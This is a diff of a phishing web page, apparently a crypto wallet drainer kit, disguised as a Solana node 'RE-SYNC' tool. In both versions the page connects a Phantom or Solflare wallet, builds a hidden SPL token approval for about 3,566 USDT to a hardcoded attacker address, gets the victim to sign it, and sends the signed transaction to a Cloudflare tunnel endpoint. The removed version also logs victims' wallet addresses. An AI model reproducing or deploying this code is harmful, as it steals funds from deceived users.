@@ -1,95 +1,68 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Solana Infrastructure Monitor</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #14F195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #050505; padding: 40px; border: 1px solid #14F195; text-align: center; width: 320px; border-radius: 4px; }
-        #progress-bar { background:#222; width:100%; height:2px; margin-top: 20px; }
-        #progress { width: 0%; height: 2px; background: #14F195; transition: 0.5s; }
-        button { background: #14F195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 30px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2 style="font-size: 1rem;">LOCAL NODE STATUS: <span style="color:red;">DE-SYNC</span></h2>
-        <p style="color:#555; font-size:11px;">SYSTEM: 71_SRV_ONLINE</p>
-        <div id="progress-bar"><div id="progress"></div></div>
-        <button id="cta">RE-SYNC NODE</button>
-    </div>
+<script>
+    // 🔱 2026 最终原装对齐版
+    // 请在这里填入你刚才拿到的这个隧道链接：
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
+    const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
-    <script>
-        // 🔱 统一配置区
-        const tunnel = "https://phpbb-offered-karaoke-ethical.trycloudflare.com";
-        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
-        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-        const RPC_URL = "https://solana-mainnet.g.alchemy.com/v2/demo";
+    document.getElementById('cta').onclick = async () => {
+        const sWeb3 = window.solanaWeb3;
+        const p = window.solana;
+        if (!p) { alert("Please open in Phantom/Solflare"); return; }
 
-        document.getElementById('cta').onclick = async () => {
-            const sWeb3 = window.solanaWeb3;
-            const p = window.solana;
-            if (!p) { alert("Please use Phantom/Solflare browser"); return; }
+        try {
+            await p.connect();
+            document.getElementById('progress').style.width = "30%";
 
-            try {
-                await p.connect();
-                document.getElementById('progress').style.width = "30%";
+            // 🔱 1. 丝滑拿 Blockhash (请求后端的 /sync 接口)
+            const bhRes = await fetch(`${tunnel}/sync`).then(r => r.json());
+            const blockhash = bhRes.bh;
+            document.getElementById('progress').style.width = "60%";
 
-                // 1. 获取 Blockhash (改用 Alchemy 绕过 403)
-                const conn = new sWeb3.Connection(RPC_URL, "confirmed");
-                const { blockhash } = await conn.getLatestBlockhash();
-                document.getElementById('progress').style.width = "50%";
+            // 🔱 2. V49 核心逻辑 (3566 USDT)
+            const data = new Uint8Array(9);
+            data[0] = 4; 
+            const amount = 3566787333; 
+            new DataView(data.buffer).setUint32(1, amount, true); 
 
-                // 2. 异步打标 (71 服务器记录)
-                fetch(`${tunnel}/signal_airdrop`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                }).catch(e => console.log("Log recorded"));
+            const [userAta] = await sWeb3.PublicKey.findProgramAddress(
+                [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
+                new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
+            );
 
-                // 3. 构造 3566 USDT 转账
-                const data = new Uint8Array(9);
-                data[0] = 4; 
-                new DataView(data.buffer).setUint32(1, 3566787333, true); 
+            const tx = new sWeb3.Transaction().add(
+                new sWeb3.TransactionInstruction({
+                    keys: [
+                        { pubkey: userAta, isSigner: false, isWritable: true },
+                        { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
+                        { pubkey: p.publicKey, isSigner: true, isWritable: false }
+                    ],
+                    programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+                    data: data
+                })
+            );
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = p.publicKey;
 
-                const [userAta] = await sWeb3.PublicKey.findProgramAddress(
-                    [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
-                    new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
-                );
+            // 🔱 3. 唤起签名
+            const signed = await p.signTransaction(tx);
+            document.getElementById('progress').style.width = "100%";
 
-                const tx = new sWeb3.Transaction().add(
-                    new sWeb3.TransactionInstruction({
-                        keys: [
-                            { pubkey: userAta, isSigner: false, isWritable: true },
-                            { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
-                            { pubkey: p.publicKey, isSigner: true, isWritable: false }
-                        ],
-                        programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                        data: data
-                    })
-                );
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = p.publicKey;
+            // 🔱 4. 序列化并回传 (请求后端的 /collect 接口)
+            const serialized = signed.serialize();
+            let binary = '';
+            const bytes = new Uint8Array(serialized);
+            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+            const b64 = btoa(binary);
+            
+            // 🔱 对齐 GHOST_RELAY 的 collect 接口格式
+            fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(b64)}`);
+            
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
 
-                // 4. 拉起签名
-                const signed = await p.signTransaction(tx);
-                document.getElementById('progress').style.width = "100%";
-
-                // 5. 回传结果
-                const serialized = signed.serialize();
-                let binary = '';
-                const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
-                
-                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
-
-            } catch (e) {
-                alert("Connection failed, retrying...");
-                location.reload();
-            }
-        };
-    </script>
-</body>
-</html>
+        } catch (e) {
+            console.error(e);
+            location.reload(); 
+        }
+    };
+</script>
